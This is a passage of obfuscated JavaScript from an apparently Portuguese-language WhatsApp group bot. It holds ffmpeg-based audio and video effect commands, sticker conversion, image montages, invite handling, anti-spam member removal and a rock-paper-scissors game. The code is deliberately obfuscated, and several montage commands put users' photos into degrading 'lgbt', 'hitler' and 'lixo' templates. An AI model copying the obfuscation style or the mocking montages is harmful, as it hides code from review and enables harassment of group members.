              const _0x3762bd = fs.readFileSync("datab/audios/qviado.mp3");
              const _0x557076 = {
                audio: _0x3762bd,
                mimetype: "audio/mpeg",
                ptt: true
              };
              const _0x584c41 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x557076, _0x584c41);
              break;
            case "videocontrario":
            case "reversevid":
              if ((_0x39e519 && _0xd2050d.message.videoMessage || !_0x54198a) && !_0x11e99e.length <= 1) {
                _0x50740b(_0x50f430);
                encmedia = _0xee3727 ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0xd2050d.message.videoMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -vf reverse -af areverse " + ran, _0x415130 => {
                  DLT_FL(media);
                  if (_0x415130) {
                    return _0x50740b("Err: " + _0x415130);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x3b53f1 = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x5effd1 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x3b53f1, _0x5effd1);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque um vídeo..");
              }
              break;
            case "videolento":
            case "slowvid":
              if ((_0x39e519 && _0xd2050d.message.videoMessage || !_0x54198a) && !_0x11e99e.length <= 1) {
                _0x50740b(_0x50f430);
                encmedia = _0xee3727 ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0xd2050d.message.videoMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -filter_complex \"[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]\" -map \"[v]\" -map \"[a]\" " + ran, _0x3dbeee => {
                  DLT_FL(media);
                  if (_0x3dbeee) {
                    return _0x50740b("Err: " + _0x3dbeee);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x2bcfc2 = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x631bdb = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2bcfc2, _0x631bdb);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque um vídeo..");
              }
              break;
            case "videorapido":
            case "fastvid":
              if ((_0x39e519 && _0xd2050d.message.videoMessage || !_0x54198a) && !_0x11e99e.length <= 1) {
                _0x50740b(_0x50f430);
                encmedia = _0xee3727 ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0xd2050d.message.videoMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -filter_complex \"[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]\" -map \"[v]\" -map \"[a]\" " + ran, _0x22d8c3 => {
                  DLT_FL(media);
                  if (_0x22d8c3) {
                    return _0x50740b("Err: " + _0x22d8c3);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x313155 = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x47a92c = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x313155, _0x47a92c);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o vídeo..");
              }
              break;
            case "audiocontrario":
            case "audioreverse":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                encmedia = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "audio");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + media + " -vf reverse -af areverse " + ran, _0x15908d => {
                  DLT_FL(media);
                  if (_0x15908d) {
                    return _0x50740b("Err: " + _0x15908d);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0xae4732 = {
                    audio: buffer453,
                    mimetype: "audio/mpeg"
                  };
                  const _0x4e83f6 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0xae4732, _0x4e83f6);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque um audio..");
              }
              break;
            case "grave2":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=1.6,asetrate=22100\" " + ran, (_0x429b1f, _0x188d1a, _0x5ebcd0) => {
                  DLT_FL(gem);
                  if (_0x429b1f) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x247076 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x39de93 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x247076, _0x39de93);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "grave":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=44100\" " + ran, (_0x3275f6, _0x146979, _0x18bfe1) => {
                  DLT_FL(gem);
                  if (_0x3275f6) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x116922 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x2199a4 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x116922, _0x2199a4);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "adolesc":
            case "vozmenino":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a atempo=1.06,asetrate=44100*1.25 " + ran, (_0x195b89, _0xe796f, _0x126a0c) => {
                  DLT_FL(gem);
                  if (_0x195b89) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x1ce071 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x8f75c7 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x1ce071, _0x8f75c7);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "tomp3":
              if (_0x39e519 && !_0xd2050d.message.imageMessage || _0xee3727) {
                post = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d.message.videoMessage;
                _0x50740b(_0x50f430);
                encmedia = _0xee3727 ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0xd2050d.message.videoMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " " + ran, _0x3105c4 => {
                  DLT_FL(media);
                  if (_0x3105c4) {
                    return _0x50740b("❌ Falha ao converter vídeo para mp3 ❌");
                  }
                  _0x926ec9 = fs.readFileSync(ran);
                  const _0x1789b2 = {
                    audio: _0x926ec9,
                    mimetype: "audio/mpeg"
                  };
                  const _0x4ae6bc = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x1789b2, _0x4ae6bc);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o vídeo para transformar em áudio por favor..");
              }
              break;
            case "bass3":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=20:width_type=o:width=2:g=15 " + ran, (_0x329389, _0x214493, _0xdb7bb9) => {
                  DLT_FL(gem);
                  if (_0x329389) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0xf47c04 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x942267 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0xf47c04, _0x942267);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "bass":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=20:width_type=o:width=2:g=15 " + ran, (_0x3fe8b9, _0x3ba618, _0x3dc478) => {
                  DLT_FL(gem);
                  if (_0x3fe8b9) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x3921d4 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x4a8ead = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x3921d4, _0x4a8ead);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "bass2":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=94:width_type=o:width=2:g=30 " + ran, (_0xdb9471, _0x588160, _0x141672) => {
                  DLT_FL(gem);
                  if (_0xdb9471) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x12959a = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x34d18e = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x12959a, _0x34d18e);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "estourar":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=90:width_type=o:width=2:g=30 " + ran, (_0x1d0d54, _0x21560f, _0x37c5ad) => {
                  DLT_FL(gem);
                  if (_0x1d0d54) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x1478fb = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x3cecc2 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x1478fb, _0x3cecc2);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "fast":
            case "audiorapido":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=95100\" " + ran, (_0x61ee41, _0x4890dd, _0x42b68a) => {
                  DLT_FL(gem);
                  if (_0x61ee41) {
                    return _0x50740b("Erro");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x5b4baf = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x57b1ba = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5b4baf, _0x57b1ba);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio...");
              }
              break;
            case "esquilo":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.7,asetrate=65100\" " + ran, (_0x515c79, _0x1c9e3f, _0x1f15c2) => {
                  DLT_FL(gem);
                  if (_0x515c79) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x1fa49c = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x4da38d = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x1fa49c, _0x4da38d);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio...");
              }
              break;
            case "audiolento":
            case "slow":
              if (_0x39e519 && !_0xd2050d.message.imageMessage && !_0xd2050d.message.videoMessage || _0x2f2cdc) {
                _0x50740b(_0x50f430);
                muk = _0x2f2cdc ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0xd2050d.message.audioMessage;
                rane = getRandom('.' + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=44100\" " + ran, (_0x4bcf0a, _0x2ca183, _0x31f81a) => {
                  DLT_FL(gem);
                  if (_0x4bcf0a) {
                    return _0x50740b("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x3b9585 = {
                    audio: hah,
                    mimetype: "audio/mpeg",
                    ptt: true
                  };
                  const _0x5cfbc8 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x3b9585, _0x5cfbc8);
                  DLT_FL(ran);
                });
              } else {
                _0x50740b("Marque o áudio..");
              }
              break;
            case "convertfig":
            case "toimg":
            case "togif":
              if (!_0x309ffb) {
                return _0x50740b("*[ ❗ ] Marque a figurinha!*");
              }
              try {
                let _0x2c718c = _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage;
                let _0x3cabf1 = await getFileBuffer(_0x2c718c, "sticker");
                if (_0x2c718c.isAnimated) {
                  _0x50740b("*「 ❗ 」 Aguarde, convertendo a figu em gif...*");
                  let _0x43cb85 = await _0x57ae2b(_0x3cabf1);
                  const _0x210d30 = {
                    url: _0x43cb85
                  };
                  const _0x2b5f98 = {
                    video: _0x210d30,
                    gifPlayback: true,
                    fileName: "stick.gif"
                  };
                  const _0x25464a = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2b5f98, _0x25464a)["catch"](_0x123c2b => {
                    _0x50740b("Erro..");
                    console.log(_0x123c2b);
                  });
                } else {
                  _0x50740b("*「 ❗ 」 Aguarde, convertendo a figu em imagem...*");
                  const _0x529556 = {
                    image: _0x3cabf1
                  };
                  const _0x486c16 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x529556, _0x486c16)["catch"](_0x207bb5 => {
                    _0x50740b("ERRO!!");
                    console.log(_0x207bb5);
                  });
                }
                DLT_FL(_0x3cabf1);
              } catch (_0x44d82b) {
                _0x50740b("Erro..");
                console.log(_0x44d82b);
              }
              break;
            case "lixo":
            case "lgbt":
            case "morto":
            case "preso":
            case "deletem":
            case "procurado":
            case "hitler":
            case "borrar":
            case "merda":
              try {
                if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) {
                  post = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d.message.imageMessage;
                  imagem = await downloadContentFromMessage(post, "image");
                  base64 = Buffer.from([]);
                  for await (const _0x235f59 of imagem) {
                    base64 = Buffer.concat([base64, _0x235f59]);
                  }
                  _0x50740b(_0x50f430);
                  _0x24e1d3 = await upload(base64);
                  const _0xaad854 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'image': {
                      'url': reqapi.montagem(_0x24e1d3, _0x267d4b)
                    }
                  }, _0xaad854)["catch"](_0x4e8717 => {
                    return _0x50740b("Erro..");
                  });
                } else {
                  _0x50740b("Selecione uma imagem...!");
                }
              } catch (_0x34b01a) {
                return _0x50740b("ERROR!!");
              }
              break;
            case "legenda":
              try {
                var [_0xd822b6, _0x9ec348] = _0x11e99e.split('/');
                if (!_0x11e99e.includes('/')) {
                  return _0x50740b("Cade a / mano?\nExemplo: " + (_0x141936 + _0x267d4b) + " Sad/Demais");
                }
                if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) {
                  _0x48d7b9 = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d.message.imageMessage;
                  owgi = await getFileBuffer(_0x48d7b9, "image");
                  _0x36d5cf = await upload(owgi);
                  const _0x4f134c = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'image': {
                      'url': reqapi.legenda(_0x36d5cf, _0xd822b6, _0x9ec348)
                    }
                  }, _0x4f134c)["catch"](_0x355d30 => {
                    return _0x50740b("Erro..");
                  });
                } else {
                  _0x50740b("Marque uma imagem...!");
                }
              } catch (_0x14a5b2) {
                return _0x50740b("ERROR!!");
              }
              break;
            case "convite":
              if (!_0x3a0a2c.includes("chat.whatsapp.com")) {
                return _0x50740b("Cadê o link do grupo que você deseja que eu entre?");
              }
              cnvt = _0x23d865.join(" ");
              _0x50740b("O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..");
              await sleep(1000);
              _0x50740b("Use " + _0x141936 + "entrar cnvt ou " + _0x141936 + "recusar " + _0x246d48 + ", alguem enviou convite para entrar no grupo dele.");
              break;
            case "recusar":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              const _0x52cd13 = {
                text: "Olá Amigo(a), sinto muito dizer, mas seu convite foi recusado 🥺"
              };
              _0x5196be.sendMessage(_0x11e99e, _0x52cd13);
              break;
            case "join":
            case "entrar":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0x18eff6 = _0x23d865.join(" ");
              if (!_0x18eff6) {
                return _0x50740b("Insira um link de convite ao lado do comando.");
              }
              if (_0x18eff6.includes("chat.whatsapp.com/") || _0x50740b("Ops, verifique o link que você inseriu.")) {
                _0x24e1d3 = _0x18eff6.split("app.com/")[1];
                try {
                  _0x5196be.groupAcceptInvite('' + _0x24e1d3);
                } catch (_0x48ef6c) {
                  if (String(_0x48ef6c).includes("resource-limit")) {
                    _0x50740b("O grupo já está com o alcance de 257 membros.");
                  }
                  if (String(_0x48ef6c).includes("not-authorized")) {
                    _0x50740b("Não foi possível entrar no grupo.\nMotivo: Banimento.");
                  }
                }
              }
              break;
            default:
              if (_0x89cd51 && _0x42a9f2 && !_0x3f2f63) {
                if (_0x17cef7 || _0x2ac64a || _0x52e919) {
                  if (_0x4c3ee0 === "contactMessage" || _0x4c3ee0 === "contactsArrayMessage" || _0x4c3ee0 === "locationMessage" || _0x4c3ee0 === "productMessage") {
                    const _0x28b8e7 = {
                      text: "Uma dessas opções estão ativada, mas por você ser ADM, não será removido(a) _(ANTI CONTATO - ANTI CATALOGO - ANTI LOCALIZAÇÃO)"
                    };
                    const _0x8ac710 = {
                      quoted: _0xd2050d
                    };
                    if (_0x3f2f63) {
                      return _0x5196be.sendMessage(_0x346d97, _0x28b8e7, _0x8ac710);
                    }
                    if (_0x1b869d) {
                      setTimeout(() => {
                        _0x5196be.sendMessage(_0x346d97, {
                          'delete': {
                            'remoteJid': _0x346d97,
                            'fromMe': false,
                            'id': _0xd2050d.key.id,
                            'participant': _0x246d48
                          }
                        });
                      }, 500);
                    }
                    if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
                      return;
                    }
                    _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                    clear = '🗑' + "\n".repeat(255) + "🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅";
                    const _0x5e15af = {
                      forwardingScore: 0x1f4,
                      isForwarded: true
                    };
                    const _0x4a1204 = {
                      text: clear,
                      contextInfo: _0x5e15af
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x4a1204);
                    const _0x5193b2 = {
                      text: "reporte aos adm o ocorrido ",
                      mentions: _0x1c25a7
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x5193b2);
                  }
                }
              }
              if (_0x89cd51 && _0x40d1ba && !_0xf59944 && !_0x3eefd0 && _0x42a9f2 && !_0x3f2f63 && !_0x13966b) {
                if (_0x221071 == null) {
                  var _0x185ae8 = limitefll.limitefl;
                } else {
                  var _0x185ae8 = _0x221071;
                }
                if (_0x3a0a2c.length >= _0x185ae8) {
                  setTimeout(() => {
                    const _0x2ecc6b = {
                      text: "Muitas Caracteres enviadas, isto é contra as normas do grupo, por precaução, eu irei remover."
                    };
                    return _0x5196be.sendMessage(_0x346d97, _0x2ecc6b);
                    console.log(colors.red("Deram Spam de caracteres.."));
                  }, 100);
                  setTimeout(async () => {
                    if (_0x1b869d) {
                      setTimeout(() => {
                        _0x5196be.sendMessage(_0x346d97, {
                          'delete': {
                            'remoteJid': _0x346d97,
                            'fromMe': false,
                            'id': _0xd2050d.key.id,
                            'participant': _0x246d48
                          }
                        });
                      }, 500);
                    }
                    if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
                      return;
                    }
                    _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                  }, 1000);
                }
              }
              switch (_0xe07169) {}
              if (_0x5725b4.includes("pedra") || _0x5725b4.includes("papel") || _0x5725b4.includes("tesoura")) {
                if (_0xd2050d.key.fromMe) {
                  return;
                }
                if (_0x89cd51) {
                  return;
                }
                if (_0x4c298f(_0x246d48) === undefined) {
                  return;
                }
                if (_0x5725b4.includes("pedra")) {
                  var _0x3d4245 = "pedra";
                } else {
                  if (_0x5725b4.includes("papel")) {
                    var _0x3d4245 = "papel";
                  } else {
                    if (_0x5725b4.includes("tesoura")) {
                      var _0x3d4245 = "tesoura";
                    }
                  }
                }
                var _0x3194f3 = _0x4c298f(_0x246d48);
                if (_0x1ddd1d[_0x3194f3].player1 === _0x246d48) {
                  _0x1ddd1d[_0x3194f3].jogada1 = _0x3d4245;
                  fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                } else if (_0x1ddd1d[_0x3194f3].player2 === _0x246d48) {
                  _0x1ddd1d[_0x3194f3].jogada2 = _0x3d4245;
                  fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                }
                if (_0x1ddd1d[_0x3194f3].jogada1 != "undefined" && _0x1ddd1d[_0x3194f3].jogada2 != "undefined") {
                  var _0x3dc0d2 = '@' + _0x1ddd1d[_0x3194f3].player1.split('@')[0] + " utilizou " + _0x1ddd1d[_0x3194f3].jogada1 + "\n\n@" + _0x1ddd1d[_0x3194f3].player2.split('@')[0] + " utilizou " + _0x1ddd1d[_0x3194f3].jogada2 + "\n\n" + _0x1eedf2(_0x1ddd1d[_0x3194f3].jogada1, _0x1ddd1d[_0x3194f3].jogada2, _0x1ddd1d[_0x3194f3].player1.split('@')[0], _0x1ddd1d[_0x3194f3].player2.split('@')[0]);
                  var _0x1f75eb = [];
                  _0x1f75eb.push(_0x1ddd1d[_0x3194f3].player1);
                  _0x1f75eb.push(_0x1ddd1d[_0x3194f3].player2);
                  const _0x1d7e6e = {
                    text: _0x3dc0d2,
                    mentions: _0x1f75eb
                  };
                  const _0x2dc89e = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x1ddd1d[_0x3194f3].group, _0x1d7e6e, _0x2dc89e);
                  _0x1ddd1d.splice(_0x3194f3, 1);
                  fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                }
              }
              const _0x4a58fd = async (_0x3a1cb1, _0x10618a, _0x4e9c96, _0x4d892c, _0x54bc2d, _0x5946cd) => {
                let _0x304b35 = [_0x10618a, _0x4e9c96, _0x4d892c, _0x54bc2d, _0x5946cd];
                for (_0x3194f3 of _0x304b35) {
                  if (!_0x3194f3) {
                    return;
                  }
                  if (_0x46e43b.includes(_0x3194f3)) {
                    const _0x4e2549 = {
                      url: _0x3a1cb1
                    };
                    const _0x2b8cc6 = {
                      audio: _0x4e2549,
                      mimetype: "audio/mpeg",
                      ptt: true
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x2b8cc6);
                  }
                }
              };
              const _0x4f6e5e = async (_0x354cfd, _0x3d8816, _0x3e043b, _0x1c8292, _0x3d823c, _0x3798bd, _0x380b2a) => {
                let _0x4f7978 = [_0x3e043b, _0x1c8292, _0x3d823c, _0x3798bd, _0x380b2a];
                for (_0x3194f3 of _0x4f7978) {
                  if (!_0x3194f3) {
                    return;
                  }
                  if (_0x5725b4.includes(_0x3194f3)) {
                    var _0x1e313f = require("./armor/funcoes/gtts")(_0x354cfd);
                    ranm = getRandom(".mp3");
                    rano = getRandom(".ogg");
                    _0x1e313f.save(ranm, _0x3d8816, function () {
                      exec("ffmpeg -i " + ranm + " -ar 48000 -vn -c:a libopus " + rano, _0x491d47 => {
                        DLT_FL(ranm);
                        _0x926ec9 = fs.readFileSync(rano);
                        const _0x3ed233 = {
                          audio: _0x926ec9,
                          ptt: true
                        };
                        const _0x1d17f7 = {
                          quoted: _0xd2050d
                        };
                        _0x5196be.sendMessage(_0x346d97, _0x3ed233, _0x1d17f7);
                        DLT_FL(rano);
                      });
                    });
                  }
                }
              };
              var _0x448d42 = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
              _0x4f6e5e('pt', "São " + _0x448d42 + " da " + _0x33c0c0.split(" ")[1], "que horas sao?");
              if (_0x46e43b == "prefix" || _0x46e43b == "prefixo") {
                if (_0xd2050d.key.fromMe) {
                  return;
                }
                _0x50740b(_0x2cd689 + " *Aqui Está O Meu Prefixo  [" + _0x141936 + "]* " + _0x2cd689);
              }
              if (_0x42a9f2 && _0x3f2f63 && _0x3ac611.toLowerCase() === "apaga") {
                if (!_0x42d32c) {
                  return;
                }
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
